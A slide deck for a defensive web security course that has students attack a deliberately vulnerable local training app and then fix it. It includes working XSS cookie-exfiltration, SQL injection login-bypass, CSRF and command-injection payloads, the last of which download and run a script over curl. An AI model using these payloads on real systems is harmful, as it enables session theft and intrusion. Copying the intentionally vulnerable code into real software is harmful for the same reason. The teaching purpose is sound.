---
marp: true
theme: default
paginate: true
lang: en
title: Web Application Security Programming
---

<!-- Slide 01 -->

# Web Application Security Programming

- Observe common web application vulnerabilities in a local environment
- Inspect the implementation boundaries where attacks become possible
- Connect observed behavior to design, implementation, and operational mitigations
- Course repository: `https://github.com/koide55/webapp-security-programming-handson`

---

<!-- Slide 02 -->

# Web Server Security

- Understand what kinds of input and requests attackers use
- Learn dangerous context boundaries: Cookie, HTML, SQL, and shell
- Use a local training app to move between vulnerability observation and mitigation
- This exercise is for defensive learning only; do not use it on public servers or third-party services

---

<!-- Slide 03 -->

# Web App Lab Environment

- Bottle: lightweight web framework
- Peewee: ORM for Python
- SQLite: local SQL database
- Helper server: local XSS, CSRF, and dummy-payload experiments
- Clone from GitHub and run with a Python virtual environment or Docker

---

<!-- Slide 04 -->

# Preparation: VS Code and Terminal

- The standard beginner editor for this course is Visual Studio Code
- Install Microsoft's Python extension
- Open the repository with `File` > `Open Folder...`
- Run commands from `Terminal` > `New Terminal`
- After setup, choose `.venv` when VS Code asks for the Python interpreter

Experienced participants may use their preferred editor, but instructor demos assume VS Code.

---

<!-- Slide 05 -->

# Frameworks We Use Here

- Bottle handles routing, forms, cookies, and HTTP responses
- Peewee maps Python models to SQLite tables
- SQLite stores users, sessions, and BBS comments in a local file
- The helper server is used only for local XSS, CSRF, and command-injection labs
- All experiments run on `localhost`

---

<!-- Slide 06 -->

# Exercise 1: Try Bottle

1. Clone the repository
2. Install dependencies in a Python virtual environment
3. Start the vulnerable training app
4. Open `http://localhost:8086/hello/security`
5. Find `@get("/hello/<name>")` in `app/main.py`

Point: a URL path parameter is passed into a Python function and rendered as HTML.

---

<!-- Slide 07 -->

# Exercise 1: Original Bottle Code

```python
from bottle import *

@route('/hello/<name>')
def index(name):
    return template('<b>Hello, {{name}}</b> !', name=name)

run(host='0.0.0.0', port=8089)
```

- The URL part `<name>` becomes a Python function argument
- `template(..., name=name)` passes the value into HTML
- In the current app, this corresponds to `@get("/hello/<name>")`

---

<!-- Slide 08 -->

# Exercise 1: Run the App

```bash
git clone https://github.com/koide55/webapp-security-programming-handson.git
cd webapp-security-programming-handson
python3 -m venv .venv
. .venv/bin/activate
python -m pip install -r requirements.txt
python app/main.py --reset-db
```

- Open `http://localhost:8086/hello/security`
- Check the route and return value in `app/main.py`

---

<!-- Slide 09 -->

# Exercise 2: Try Peewee and SQLite

- `Users` and `Comments` models define database tables
- `initialize_database()` creates the tables and inserts seed users
- The app stores data in `app/data.db`
- Seed accounts:
  - `koide` / `password`
  - `alice` / `alice123`
  - `bob` / `bob123`

---

<!-- Slide 10 -->

# Exercise 2: Original Peewee Code

```python
from peewee import *

db = SqliteDatabase('data.db')

class Users(Model):
    username = CharField()
    password = CharField()
    class Meta:
        database = db

db.connect()
db.create_tables([Users])
Users(username='koide', password='abcd').save()
Users(username='hirosk', password='1234').save()
```

- `SqliteDatabase('data.db')` opens a SQLite file
- `Users(Model)` maps a Python class to a database table
- The current app adds `userid`, `cookie`, and `Comments`

---

<!-- Slide 11 -->

# Exercise 2: Inspect SQLite

```bash
sqlite3 app/data.db
.tables
.schema users
.schema comments
select userid, username, password, cookie from users;
.quit
```

- Compare model definitions with table definitions
- Notice that passwords are stored in plain text
- Separate "working implementation" from "safe implementation"

---

<!-- Slide 12 -->

# Exercise 2: Database Operations

- Peewee query example:
  - `Users.get_or_none(Users.username == "koide")`
- SQLite direct query example:
  - `select * from users where username='koide';`
- Compare ORM-generated access with hand-written SQL
- This difference becomes important in the SQL injection exercise

---

<!-- Slide 13 -->

# Exercise 2: Database Checkpoints

- `Users` stores users, passwords, and cookie-related values
- `Comments` stores BBS comments and authors
- `ForeignKeyField` connects comments to users
- Discussion: explain which data should be stored and which data should not

---

<!-- Slide 14 -->

# Session Hijacking Lab

- HTTP does not remember the user across requests by itself
- Login state is managed with cookies and server-side information
- If a cookie is stolen, another browser may impersonate the user
- This chapter observes what cookies do and how to protect them

---

<!-- Slide 15 -->

# HTTP Review

1. The browser sends an HTTP request
2. The web server returns an HTTP response
3. The browser interprets HTML and displays the page

What to observe:

- URL
- HTTP method
- Form data
- Cookie
- Response body

---

<!-- Slide 16 -->

# HTTP Is Stateless

- The first request and the second request are separate by default
- Even after login, the server needs information to know whether it is the same user
- Cookie-based session management is the common mechanism
- Mistakes in session management can lead to impersonation

---

<!-- Slide 17 -->

# Stateless and Stateful

- Stateless:
  - Each request is processed independently
  - This is the basic nature of HTTP
- Stateful:
  - Past state affects current processing
  - Examples: login state, shopping carts, author identity
- Web apps build stateful experiences on top of stateless HTTP

---

<!-- Slide 18 -->

# HTTP Cookie and Session Management

- After login, the server issues a session-related cookie
- The browser sends the cookie with later requests
- The server uses the cookie value to find the logged-in user
- If the cookie is predictable, stolen, or poorly protected, the session can be abused

---

<!-- Slide 19 -->

# What Cookies Must Protect

- Session IDs must be sufficiently random
- Add cookie attributes when appropriate:
  - `HttpOnly`
  - `Secure`
  - `SameSite`
- Manage expiration and logout on the server side
- This material intentionally includes weak behavior so the differences are visible

---

<!-- Slide 20 -->

# Session Hijacking

- A user logs in and receives a cookie
- An attacker obtains the cookie value
- The attacker sends requests with the stolen cookie
- If the server accepts it, the attacker is treated as the victim

Key idea: password authentication can be bypassed after the session is stolen.

---

<!-- Slide 21 -->

# Session Hijacking

- A cookie after successful login becomes proof of identity
- Copying the cookie can reproduce login state in another browser
- Predictable cookie values, JavaScript-readable cookies, and weak leakage response are dangerous
- The exercise uses the app's Cookie page so students do not need browser developer tools

---

<!-- Slide 22 -->

# Training Web App

Minimum features:

- Sign up
- Login and logout
- MyPage
- BBS
- Contact form

The teaching code is in GitHub:

`https://github.com/koide55/webapp-security-programming-handson`

---

<!-- Slide 23 -->

# Code Structure

```text
app/
  main.py          # vulnerable training app
  views/bbs.tpl   # BBS template
tools/
  attacker_server.py
docs/
  setup.en.md
  exercises.en.md
  security-notes.en.md
slides/
  webapp-security-programming-handson-2026-en.pptx
```

The repository includes the app, helper server, setup guide, and exercises.

---

<!-- Slide 24 -->

# Read the Code

- `app/main.py`
  - Routes, database operations, cookies, and intentionally vulnerable logic
- `app/views/bbs.tpl`
  - BBS HTML template
- `tools/attacker_server.py`
  - XSS receiver, CSRF page, and dummy payload distributor
- `docs/`
  - Student instructions and instructor notes

---

<!-- Slide 25 -->

# Database Configuration

```python
DBFILE = BASE_DIR / "data.db"
db = SqliteDatabase(str(DBFILE))

class Users(BaseModel):
    userid = PrimaryKeyField()
    username = CharField(null=True, unique=True)
    password = CharField(null=True)
    cookie = CharField(null=True)
```

- The SQLite file is `app/data.db`
- `--reset-db` initializes it

---

<!-- Slide 26 -->

# Sign Up

Processing flow:

1. Receive `username` and `password` from the form
2. Check empty values and duplicate usernames
3. Save with `Users.create()`
4. Send the user to the login page

Observation points:

- The current app stores passwords in plain text
- The fix task considers password hashing

---

<!-- Slide 27 -->

# Login

For the SQL injection exercise, the login implementation is intentionally vulnerable.

```python
sql = "SELECT * FROM users WHERE username='" + username + \
      "' and password='" + password + "';"
records = cursor.execute(sql)
```

- On success, the app issues a cookie
- The executed SQL is displayed so students can observe dangerous concatenation

---

<!-- Slide 28 -->

# Logout and MyPage

- `/logout`
  - Deletes `cookie_id`
  - Returns to the login page
- `/mypage`
  - Finds the current user from the cookie
  - Asks for login if no user is found

Discussion:

- What is dangerous when the app relies only on cookie values?
- Where should session invalidation be managed?

---

<!-- Slide 29 -->

# Exercise 3: Session Hijacking

1. Log in as `koide` in a normal window
2. Log in as `alice` in another browser or incognito window
3. Open `http://localhost:8086/cookies` in each window
4. Copy the cookie and reload the other window
5. Observe how the displayed user changes

Goal: understand that cookies represent login state.

---

<!-- Slide 30 -->

# Check Cookies in the Web App

Steps:

1. Log in
2. Open `Cookie` in the navigation
3. Look at `Cookie header`
4. Look at how `cookie_id` is shown
5. Compare values from different browsers

Values to check:

- The `cookie_id` stored in the browser
- The value the app uses after signature verification
- The corresponding user in the DB

---

<!-- Slide 31 -->

# Exercise 3 Advanced: Compare Signed Cookies

Observe these lines in `app/main.py`:

```python
response.set_cookie("cookie_id", cookie_id, secret=COOKIE_SECRET)
request.get_cookie("cookie_id", secret=COOKIE_SECRET)
```

Questions:

- With `secret`, can you simply rewrite the cookie to `user1`?
- What changes if `secret` is removed?
- What do `HttpOnly` and `SameSite` protect?

---

<!-- Slide 32 -->

# XSS Lab

- A string posted to BBS is displayed as HTML
- If escaping is disabled, JavaScript inside a post can execute
- If JavaScript can read cookies, it may send them elsewhere
- The helper server gives us a local destination for the experiment

---

<!-- Slide 33 -->

# BBS 1/3: Routing

```python
@get("/bbs")
def bbs_form():
    user = current_user()
    comments = Comments.select().order_by(Comments.commentid)
    return template("bbs", username=user.username, comments=comments)
```

- Get the logged-in user from the cookie
- Get comments from the database
- Pass username and comments to the template

---

<!-- Slide 34 -->

# BBS 2/3: Posting

```python
@post("/bbs")
def post_bbs():
    user = current_user()
    comment = request.forms.decode().get("comment", "")
    Comments.create(user=user, comment=comment, datetime=now)
    redirect("/bbs")
```

- Save form input to the DB
- At this point the value is not HTML yet
- The dangerous context appears when the value is displayed

---

<!-- Slide 35 -->

# BBS 3/3: Display

```html
{{!comment.comment}}
```

- `!` disables escaping in Bottle templates
- User input is interpreted as HTML
- This is intentionally left for the XSS exercise

Safer direction:

```html
{{comment.comment}}
```

---

<!-- Slide 36 -->

# Cross-Site Scripting Attack

- The victim opens a trusted web page
- The trusted page includes attacker-controlled script
- The browser runs the script in the trusted page context
- Cookies, page content, and actions may be abused

Important: the script runs because the trusted site reflected or stored unsafe input.

---

<!-- Slide 37 -->

# Cross-Site Scripting

- Attacker-controlled script is mixed into a site the user trusts
- The browser runs it as that site's script
- Cookies or on-screen information may be read
- The root cause is not merely "input"; it is the output context

---

<!-- Slide 38 -->

# Inspect the HTML

Inspect the BBS output.

- Normal strings are displayed as text
- A posted `<script>` is interpreted as a tag
- `{{!comment.comment}}` allows dangerous output

Discussion:

- Should the app delete content on input, or escape it on output?
- Are the mitigations the same for HTML, attributes, and JavaScript?

---

<!-- Slide 39 -->

# Simple Local Helper Server

```bash
. .venv/bin/activate
python tools/attacker_server.py
```

- `http://localhost:8090/`
  - Receives cookie strings and displays logs
- `http://localhost:8090/csrf`
  - CSRF exercise page
- `http://localhost:8090/badscript`
  - Harmless dummy payload

---

<!-- Slide 40 -->

# A Simple Local Helper Site

- Run `tools/attacker_server.py`
- Use `http://localhost:8090/?cookie_id=...` as the XSS destination
- Received values are recorded in `stolen_cookies.log`
- This helper is for local classroom experiments only

---

<!-- Slide 41 -->

# Reference: Delete Extra Comments

After the XSS exercise, you can delete posts directly from the DB.

```bash
sqlite3 app/data.db \
  "delete from comments where comment like '<script>%';"
```

Or initialize the DB:

```bash
python app/main.py --reset-db --init-only
```

---

<!-- Slide 42 -->

# Exercise 4: XSS

1. Log in to the web app and open BBS
2. Start the helper server
3. Post this comment

```html
<script>document.location="http://localhost:8090/?cookie_id="+document.cookie</script>
```

4. Check received values at `http://localhost:8090`
5. Explain why the cookie was readable

---

<!-- Slide 43 -->

# Exercise 4 Advanced: Explain XSS

Research and explain:

- The role of the helper server
- The role of SQLite
- The dangerous point in the BBS template
- The role of cookie attributes
- The meaning of output escaping

Summarize in a table: root cause, observed behavior, mitigation.

---

<!-- Slide 44 -->

# CSRF Lab

- The browser automatically attaches cookies to requests for the target site
- A form on another site can still POST to the target site
- If the server does not verify the action came from the legitimate page, unintended actions can succeed
- We observe this with BBS posting

---

<!-- Slide 45 -->

# Cross-Site Request Forgery

1. The user is logged in to BBS
2. The same browser opens another site
3. The other site submits a POST form to BBS
4. The browser automatically attaches the BBS cookie
5. If BBS does not verify the request, the post succeeds

Mitigations: CSRF tokens, Origin/Referer checks, SameSite cookies.

---

<!-- Slide 46 -->

# Helper Server: CSRF Page

`/csrf` in `tools/attacker_server.py`:

```python
@get("/csrf")
def csrf_page():
    return page("CSRF Demo", """
      <form action="http://localhost:8086/bbs" method="post">
        <input type="hidden" name="comment" value="[CSRF] ...">
        <button type="submit">Submit</button>
      </form>
    """)
```

---

<!-- Slide 47 -->

# CSRF Page HTML

```html
<form action="http://localhost:8086/bbs" method="post">
  <input type="hidden" name="token" value="a73+f*&t5">
  <input type="hidden" name="comment" value="[CSRF] Posted from helper site">
  <button type="submit">Submit</button>
</form>
```

- A fixed token is not a defense
- The server must verify an unpredictable token

---

<!-- Slide 48 -->

# Exercise 5: CSRF

1. Start the web app
2. Start the helper server
3. Stay logged in to BBS
4. Open `http://localhost:8090/csrf` in the same browser
5. Press the button
6. Check BBS

Discussion: why was the cookie sent even though the post came from another site?

---

<!-- Slide 49 -->

# SQL Injection Lab

- Start from safe ORM usage, then observe dangerous string-concatenated SQL
- User input is interpreted as part of the SQL statement
- On the login page, compare input values with the executed SQL
- Connect the observation to a placeholder-based fix task

---

<!-- Slide 50 -->

# Deliberately Vulnerable Design

Safer directions:

- Use ORM condition expressions
- Use placeholders
- Separate input values from SQL structure

Dangerous direction for the exercise:

- Build SQL strings manually
- Concatenate user input directly
- Display errors or executed SQL for observation

---

<!-- Slide 51 -->

# Make Login Vulnerable

```python
username = request.forms.decode().get("username", "")
password = request.forms.decode().get("password", "")

sql = "SELECT * FROM users WHERE username='" + username + \
      "' and password='" + password + "';"
records = cursor.execute(sql)
```

- Input can break SQL syntax
- `app/main.py` keeps this implementation for the exercise

---

<!-- Slide 52 -->

# Exercise 6: SQL Injection

Try these on the login page:

| username | password |
| --- | --- |
| `koide` | `' or 'a'='a` |
| `koide' --` | `anything` |

Check:

- The executed SQL shown on screen
- Why authentication succeeded
- What changes when placeholders are used

---

<!-- Slide 53 -->

# Command Injection Lab

- The contact form intentionally uses a dangerous shell call
- User input is interpreted as part of an OS command
- The exercise uses only harmless file creation and dummy payloads
- Real applications should use dedicated libraries instead of `os.system()`

---

<!-- Slide 54 -->

# Command Injection

Dangerous flow:

1. A user submits a web form
2. The app concatenates the input into a shell command
3. The shell interprets delimiters and quotes
4. An unexpected command runs

Point: as with SQLi and XSS, data is interpreted as code.

---

<!-- Slide 55 -->

# Boundary Between Data and Commands

Examples of dangerous characters:

- `"`
- `;`
- `|`
- `&`
- `#`

These are not just text for the shell. They have syntax meaning.

Mitigation: avoid the shell, pass arguments as arrays, and use dedicated APIs.

---

<!-- Slide 56 -->

# Safer Implementation Thinking

Avoid:

```python
os.system("command " + user_input)
```

Choose:

```python
subprocess.run(["command", user_input], shell=False)
```

Better:

- `smtplib` for email
- `pathlib` for files
- Placeholders or ORM APIs for DB operations

---

<!-- Slide 57 -->

# Vulnerable Contact Form

```python
command = f'/bin/echo "From: {address}\n{comment}" >> "{OUTBOX_FILE}"'
exit_code = os.system(command)
```

- `comment` is interpreted by the shell
- A mail library or file API should be used instead
- The exercise displays the executed command so the broken boundary is visible

---

<!-- Slide 58 -->

# Dummy Payload Distribution

Helper server `/badscript`:

```python
Path("badscript_ran.txt").write_text(
    "dummy payload executed\n",
    encoding="utf-8",
)
```

- It only creates a harmless file
- It safely demonstrates a "download and execute" flow through command injection

---

<!-- Slide 59 -->

# Preparation Check

URLs:

- Web app: `http://localhost:8086`
- Helper server: `http://localhost:8090`
- Dummy payload: `http://localhost:8090/badscript`

Files to check:

- `app/data.db`
- `app/mail_outbox.txt`
- `stolen_cookies.log`
- `badscript_ran.txt`

---

<!-- Slide 60 -->

# Observe Command Injection

Input example for the contact form message:

```text
"; /bin/echo injected > command_injection_result.txt; #
```

Example using the helper server:

```text
"; curl -s http://localhost:8090/badscript -o downloaded_badscript.py; python3 downloaded_badscript.py; #
```

Do not run this outside the local exercise.

---

<!-- Slide 61 -->

# Command Injection Mitigations

- Do not call a shell in the first place
- Do not build commands through string concatenation
- Use `shell=False` and argument arrays
- Do not treat input as command syntax
- Minimize execution and file permissions
- Log execution details and detect abnormal behavior

---

<!-- Slide 62 -->

# Exercise 7: Command Injection

1. Log in to the web app
2. Open `/contact`
3. Try the harmless file-creation example
4. Read the command displayed on screen
5. Refactor the implementation so it does not use `os.system()`

Discussion:

- Which characters were interpreted as shell syntax?
- Where should input and command be separated?

---

<!-- Slide 63 -->

# Clean Up the UI with Pico.css

- Usable UI matters even in security exercises
- Clear input fields, error messages, and navigation make observation easier
- Use Pico.css instead of a large UI kit
- One stylesheet on semantic HTML improves forms and tables

---

<!-- Slide 64 -->

# Why Pico.css

- Start with one `link`
- No need to memorize many class names
- `label`, `input`, `button`, `table`, and `nav` look reasonable by default
- It fits Bottle's simple templates
- It keeps UI cleanup separate from security mitigations

---

<!-- Slide 65 -->

# Directory Layout

Pico.css sample:

```text
app/
  static/
    app.css
  main.py
  views/
    base.tpl
    login.tpl
examples/
  pico-css/
```

Sample code is in `examples/pico-css/`.

---

<!-- Slide 66 -->

# Add Static File Serving to main.py

```python
from bottle import static_file

@get("/static/<filepath:path>")
def static_files(filepath):
    return static_file(filepath, root=str(BASE_DIR / "static"))
```

Move the login page to a template:

```python
@get("/login")
def login_form():
    return template("login", error=None)
```

---

<!-- Slide 67 -->

# base.tpl

```html
<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <meta name="color-scheme" content="light dark">
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@picocss/pico@2/css/pico.min.css">
  <link rel="stylesheet" href="/static/app.css">
  <title>{{title or "WebApp Security"}}</title>
</head>
<body>
  <main class="container">{{!base}}</main>
</body>
</html>
```

---

<!-- Slide 68 -->

# login.tpl

```html
% rebase("base.tpl", title="Login")

<article>
  <h1>Login</h1>
  % if error:
    <p role="alert" class="notice-error">{{error}}</p>
  % end
  <form action="/login" method="post">
    <label>Username <input name="username" required></label>
    <label>Password <input name="password" type="password" required></label>
    <button type="submit">Login</button>
  </form>
</article>
```

Pico.css styles form elements automatically.

---

<!-- Slide 69 -->

# Exercise 8: Improve the UI with Pico.css

1. Review the sample in `examples/pico-css/`
2. Add `static/app.css` and `views/base.tpl`
3. Move the `login` page into a template
4. Gradually move other pages into templates
5. After UI cleanup, check how SQLi, XSS, and CSRF behavior changes
6. In Exercise 9, implement vulnerability mitigations one by one

Final goal: grow a working app into material that can explain security clearly.

---

<!-- Slide 70 -->

# Exercise 9: Fix Tasks

Implement these mitigations one at a time and confirm that the attack no longer works.

- Replace login SQL with placeholders
- Enable HTML escaping in the BBS display
- Add `HttpOnly` and `SameSite=Lax` to the cookie
- Generate a CSRF token per session and verify it on POST
- Remove `os.system()` from `/contact`
- Store hashed passwords

---

<!-- Slide 71 -->

# Store Passwords as Hashes

- Do not store passwords in plain text
- Do not use simple SHA-256; use a salted, intentionally expensive method
- In production, prefer Argon2, bcrypt, or scrypt
- For this minimal exercise, `hashlib.pbkdf2_hmac()` can be used
- Store algorithm, iteration count, salt, and digest together

At login time, fetch by username and verify the submitted password with `verify_password()`.

---

<!-- Slide 72 -->

# Separate Answers and Instructor Hints

- Student exercises: `docs/exercises.en.md`
- Advanced tasks: `docs/advanced-tasks.en.md`
- Security map: `docs/security-notes.en.md`
- Example answers: `docs/solutions.en.md`
- Instructor hints: `docs/instructor-hints.en.md`

During the exercise, do not show answers immediately. Use instructor hints for gradual support.

---

<!-- Slide 73 -->

# Cleanup and Windows Support

Files generated during exercises:

- `app/data.db`
- `app/mail_outbox.txt`
- `stolen_cookies.log`
- `command_injection_result.txt`
- `downloaded_badscript.py`
- `badscript_ran.txt`

Most Windows environments do not include `make`, so use:

```powershell
py tools/clean.py
```

---

<!-- Slide 74 -->

# Wrap-up

- Web app vulnerabilities often appear where input is interpreted in another context
- Cookie, HTML, SQL, shell, and password storage each require different defenses
- Observe first, then fix, so you can explain what the mitigation changes
- End by summarizing root cause, observed behavior, and mitigation in a table

